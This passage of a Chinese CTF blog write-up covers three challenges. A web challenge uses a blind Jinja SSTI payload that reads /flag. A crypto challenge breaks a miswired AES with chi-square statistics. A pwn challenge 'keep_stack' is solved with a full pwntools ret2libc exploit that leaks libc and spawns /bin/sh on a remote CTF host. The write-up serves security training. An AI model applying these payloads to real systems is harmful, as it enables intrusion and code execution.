class="subst">&#123;url_base&#125;</span>/api/fix-secret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 触发 SSTI，将 Flag 写入静态文件</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Triggering Blind SSTI RCE to dump flag...&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;&#123;% set f = self.__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag&#x27;).read() %&#125;&#123;% set w = self.__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/datas/upload_files/img/f.txt&#x27;, &#x27;w&#x27;) %&#125;&#123;% set _ = w.write(f) %&#125;&#123;% set _ = w.close() %&#125;&quot;</span></span><br><span class="line">requests.get(<span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span>/protected?password=hacked123&amp;user=&quot;</span> + requests.utils.quote(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 下载 Flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Fetching flag...&quot;</span>)</span><br><span class="line">res_flag = requests.get(<span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span>/download?filename=img/f.txt&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, res_flag.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>题目核心代码在 <code>task.py</code></p>
+<p>flag 被要求满足 flag{uuid4} 的格式，同时给出了 md5(flag)。然后做了两层同一个 64 表代换的 Base64 编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = en(en(flag, key), key).encode()</span><br><span class="line">c = bin(bytes_to_long(c))[2:]</span><br><span class="line">p = [decision(int(i)) <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，先得到一个字符串 c，再把 c 的每一位比特送进 decision()，得到一个很长的样本列表，最后整体 LZMA 压缩写入 output</p>
+<p>decision(t) 的逻辑是：</p>
+<ul>
+<li><code>t = 0</code>：返回 <code>urandom(16 * 4500)</code></li>
+<li><code>t = 1</code>：返回 <code>AES(key).encrypt_ecb(urandom(16 * 4500)</code></li>
+</ul>
+<p>问题出在 <code>aes.py</code></p>
+<p>正常 AES-128 最后一轮应该用第 10 轮轮密钥，也就是 <code>self.round_keys[40:44]</code></p>
+<p>但题目里的实现最后用了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>.add_round_key(state, <span class="variable language_">self</span>.round_keys[<span class="number">16</span>:<span class="number">20</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这相当于把最后一轮轮密钥切片用错了</p>
+<p>于是 <code>aes.encrypt_ecb(m)</code> 虽然看起来“挺随机”，但它已经不是一个足够好的随机置换族实现了</p>
+<p>和真正的 <code>urandom(...)</code> 比，统计特征会有偏差</p>
+<p>所以这题第一步就变成了：</p>
+<p>对 <code>output</code> 里的每个样本判断它更像真随机（表示 bit&#x3D;0）还是错误 AES 输出（表示 bit&#x3D;1）</p>
+<p>每个样本长度是 <code>16 * 4500 = 72000</code> 字节，也就是 4500 个 <code>16-byte block</code></p>
+<p>如果只是看整串字节频率，0 和 1 很接近；但按 16 个字节位置分别做统计，偏差会明显很多</p>
+<p>做法：</p>
+<ol>
+<li>把一个样本按 16 字节分块</li>
+<li>对每个字节位置 <code>pos = 0..15</code></li>
+<li>统计该位置上 4500 个字节的分布</li>
+<li>对 256 个取值做卡方统计</li>
+<li>把 16 个位置的卡方值加总，作为这个样本的分数</li>
+</ol>
+<p>经验上：</p>
+<ul>
+<li>真随机分数更低</li>
+<li>错误 AES 分数更高</li>
+</ul>
+<p>于是就能把 607 个样本恢复成 607 个比特</p>
+<p>恢复出的外层密文是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> lzma</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">TABLE = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pos_chisq</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    <span class="comment"># 72000 bytes = 4500 * 16</span></span><br><span class="line">    blocks = [b[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">16</span>)]</span><br><span class="line">    total = <span class="number">0.0</span></span><br><span class="line">    n = <span class="built_in">len</span>(blocks)</span><br><span class="line">    exp = n / <span class="number">256.0</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        cnt = Counter(block[pos] <span class="keyword">for</span> block <span class="keyword">in</span> blocks)</span><br><span class="line">        total += <span class="built_in">sum</span>((cnt[v] - exp) ** <span class="number">2</span> / exp <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line">raw = lzma.decompress(<span class="built_in">open</span>(<span class="string">&quot;output&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">p = ast.literal_eval(raw.decode(<span class="string">&quot;latin1&quot;</span>))</span><br><span class="line"></span><br><span class="line">scores = [pos_chisq(x) <span class="keyword">for</span> x <span class="keyword">in</span> p]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个阈值是根据样本分布和本地模拟得到的</span></span><br><span class="line">THRESHOLD = <span class="number">4365.312</span></span><br><span class="line"></span><br><span class="line">bits = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> s &gt; THRESHOLD <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> s <span class="keyword">in</span> scores)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bin(bytes_to_long(c))[2:] 丢了 1 个前导 0</span></span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span> + bits, <span class="number">2</span>).to_bytes(<span class="number">76</span>, <span class="string">&#x27;big&#x27;</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># kccy2ybLSqcNoP+dHCc+HGv22pHNZCfqAqldLAvfnQLNoacbHC9b2Abo1g+NjQc2jymd2MvRo5m=</span></span><br></pre></td></tr></table></figure>
+
+<p>这里要注意一个细节：</p>
+<p>题目里用了 bin(bytes_to_long(c))[2:]，所以如果原始字节串最高位是 0，它会被丢掉。恢复时要手动补回去</p>
+<p>题目里的 en(m, key) 实际上是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64(m).translate(table -&gt; key)</span><br></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">en(m) = g(base64(m))</span><br></pre></td></tr></table></figure>
+
+<p>其中 g 是一个 64 字符置换</p>
+<p>因此整体可写成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = g(base64(g(base64(flag))))</span><br></pre></td></tr></table></figure>
+
+<p>同时题目还给了两个极强约束：</p>
+<ol>
+<li>flag 形如 <code>flag&#123;xxxxxxxx-xxxx-4xxx-[89ab]xxx-xxxxxxxxxxxx&#125;</code></li>
+<li>md5(flag) &#x3D; <code>ec2783d8262e2621eece6e9e236479dc</code></li>
+</ol>
+<p>所以最后一步不是盲猜，而是：</p>
+<ul>
+<li>把 flag{uuid4} 的结构写成约束</li>
+<li>把双层同表代换写成约束</li>
+<li>让候选满足外层密文</li>
+<li>最后用 MD5 做唯一筛选</li>
+</ul>
+<p>最终得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> lzma</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> UUID</span><br><span class="line"></span><br><span class="line">MD5_TARGET = <span class="string">&quot;ec2783d8262e2621eece6e9e236479dc&quot;</span></span><br><span class="line">FINAL_FLAG = <span class="string">&quot;flag&#123;48a67e13-9999-479f-8e44-4fb39e28d417&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_uuid_v4</span>(<span class="params">u: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = UUID(u, version=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(x) == u</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pos_chisq</span>(<span class="params">sample: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对 72000 字节样本按 16-byte block 分组，</span></span><br><span class="line"><span class="string">    在每个字节位置上做 256 类卡方统计，再把 16 个位置加总。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(sample) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">    blocks = [sample[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(sample), <span class="number">16</span>)]</span><br><span class="line">    n = <span class="built_in">len</span>(blocks)                  <span class="comment"># 4500</span></span><br><span class="line">    exp = n / <span class="number">256.0</span></span><br><span class="line"></span><br><span class="line">    total = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        cnt = Counter(block[pos] <span class="keyword">for</span> block <span class="keyword">in</span> blocks)</span><br><span class="line">        total += <span class="built_in">sum</span>((cnt.get(v, <span class="number">0</span>) - exp) ** <span class="number">2</span> / exp <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_outer_ciphertext</span>(<span class="params">path=<span class="string">&quot;output&quot;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    raw = lzma.decompress(<span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">    p = ast.literal_eval(raw.decode(<span class="string">&quot;latin1&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个 p[i] 对应 c 的 1 个比特</span></span><br><span class="line">    scores = [pos_chisq(x) <span class="keyword">for</span> x <span class="keyword">in</span> p]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这道题这份样本上可用的经验阈值</span></span><br><span class="line">    <span class="comment"># score &gt; threshold 判成 bit 1，否则 bit 0</span></span><br><span class="line">    threshold = <span class="number">4365.312</span></span><br><span class="line">    bits = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> s &gt; threshold <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> s <span class="keyword">in</span> scores)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 题目使用 bin(bytes_to_long(c))[2:]，最高位 0 会丢掉</span></span><br><span class="line">    <span class="comment"># 恢复时需要补回这个前导 0</span></span><br><span class="line">    c = <span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span> + bits, <span class="number">2</span>).to_bytes(<span class="number">76</span>, <span class="string">&#x27;big&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_final_flag</span>(<span class="params">flag: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    inner = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> is_valid_uuid_v4(inner), <span class="string">&quot;not a valid uuid4&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> hashlib.md5(flag.encode()).hexdigest() == MD5_TARGET, <span class="string">&quot;md5 mismatch&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    outer = recover_outer_ciphertext(<span class="string">&quot;output&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] recovered outer ciphertext:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(outer)</span><br><span class="line"></span><br><span class="line">    verify_final_flag(FINAL_FLAG)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] final flag:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(FINAL_FLAG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="keep-stack"><a href="#keep-stack" class="headerlink" title="keep_stack"></a>keep_stack</h3><p>这题的洞点是栈上 “隔 4 写 2” 的越界写，而且还能自改 <code>idx</code>，所以不是普通 ret2libc，而是一个要利用 glibc 启动栈帧的题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwn-46c82d2382.adworld.xctf.org.cn&#x27;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">USE_SSL = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">BASE = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">BIN  = os.path.join(BASE, <span class="string">&#x27;keep_stack&#x27;</span>)</span><br><span class="line">LIBC = os.path.join(BASE, <span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">LD   = os.path.join(BASE, <span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = ELF(BIN, checksec=<span class="literal">False</span>)</span><br><span class="line">context.timeout = <span class="number">5</span></span><br><span class="line">elf = context.binary</span><br><span class="line">libc = ELF(LIBC, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">PROMPT = <span class="string">b&#x27;length: \n&#x27;</span></span><br><span class="line"></span><br><span class="line">MAIN     = <span class="number">0x401787</span></span><br><span class="line">REENTER  = <span class="number">0x4017cb</span></span><br><span class="line">PUTS_PLT = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">PUTS_GOT = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">POP_RDI  = <span class="number">0x4011e1</span></span><br><span class="line">RET      = <span class="number">0x401124</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p16</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> pack(x &amp; <span class="number">0xffff</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_boot_payload</span>():</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">b&#x27;65535X&#x27;</span></span><br><span class="line">        + <span class="string">b&#x27;AA&#x27;</span> * <span class="number">32</span></span><br><span class="line">        + p16(<span class="number">0xffff</span>)</span><br><span class="line">        + <span class="string">b&#x27;BB&#x27;</span></span><br><span class="line">        + p16(<span class="number">41</span>)</span><br><span class="line">        + p16(REENTER)</span><br><span class="line">        + p16(REENTER &gt;&gt; <span class="number">32</span>)</span><br><span class="line">        + <span class="string">b&#x27;\nZ&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_stride2_payload</span>(<span class="params">chain_qwords</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">b&#x27;AA&#x27;</span> * <span class="number">64</span></span><br><span class="line">        + p16(<span class="number">0xffff</span>) + p16(<span class="number">0</span>) + p16(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line">        + p16(<span class="number">83</span>)</span><br><span class="line">        + <span class="string">b&#x27;&#x27;</span>.join(p64(x) <span class="keyword">for</span> x <span class="keyword">in</span> chain_qwords)</span><br><span class="line">        + <span class="string">b&#x27;\nZ&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_puts_leak</span>(<span class="params">blob: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    marker = <span class="string">b&#x27;\n&#x27;</span> + PROMPT</span><br><span class="line">    end = blob.rfind(marker)</span><br><span class="line">    <span class="keyword">if</span> end == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&#x27;failed to find prompt in leak blob: <span class="subst">&#123;blob!r&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    input_pos = blob.rfind(<span class="string">b&#x27;input: &#x27;</span>, <span class="number">0</span>, end)</span><br><span class="line">    <span class="keyword">if</span> input_pos == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&#x27;failed to find input echo in leak blob: <span class="subst">&#123;blob!r&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    line_end = blob.find(<span class="string">b&#x27;\n&#x27;</span>, input_pos, end)</span><br><span class="line">    <span class="keyword">if</span> line_end == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&#x27;failed to find end of input echo: <span class="subst">&#123;blob!r&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    leaked = blob[line_end + <span class="number">1</span>:end]</span><br><span class="line">    <span class="keyword">return</span> u64(leaked.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> process([LD, <span class="string">&#x27;--library-path&#x27;</span>, BASE, BIN])</span><br><span class="line">    <span class="keyword">return</span> remote(HOST, PORT, ssl=USE_SSL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait_length</span>(<span class="params">io</span>):</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(PROMPT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io = start()</span><br><span class="line">    boot = make_boot_payload()</span><br><span class="line"></span><br><span class="line">    wait_length(io)</span><br><span class="line"></span><br><span class="line">    io.send(boot)</span><br><span class="line">    wait_length(io)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># round 2: stride2 -&gt; leak puts and return to main</span></span><br><span class="line">    leak_chain = [POP_RDI, PUTS_GOT, PUTS_PLT, MAIN]</span><br><span class="line">    io.send(make_stride2_payload(leak_chain))</span><br><span class="line">    leak_blob = wait_length(io)</span><br><span class="line">    puts_addr = parse_puts_leak(leak_blob)</span><br><span class="line"></span><br><span class="line">    libc.address = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&#x27;puts leak  = <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">f&#x27;libc base  = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">f&#x27;system     = <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">f&#x27;/bin/sh    = <span class="subst">&#123;<span class="built_in">hex</span>(binsh_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># round 3: stride4 again -&gt; reenter one more time</span></span><br><span class="line">    io.send(boot)</span><br><span class="line">    wait_length(io)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># round 4: stride2 -&gt; final ret2libc</span></span><br><span class="line">    final_chain = [RET, POP_RDI, binsh_addr, system_addr]</span><br><span class="line">    io.send(make_stride2_payload(final_chain))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69dde0f9f0cf5d89b0ebcef8.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/CTF/" title="CTF" data-aos="zoom-in">CTF</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag" title="CTF">CTF</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="知攻善防实验室 Linux 应急响应-2" class="lazyload">
+      <a href="/2026/04/11/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%AE%9E%E9%AA%8C%E5%AE%A4%20Linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-2/" aria-label="后一篇: 知攻善防实验室 Linux 应急响应-2"  title="后一篇: 知攻善防实验室 Linux 应急响应-2"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          知攻善防实验室 Linux 应急响应-2
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        55.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        04:48
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
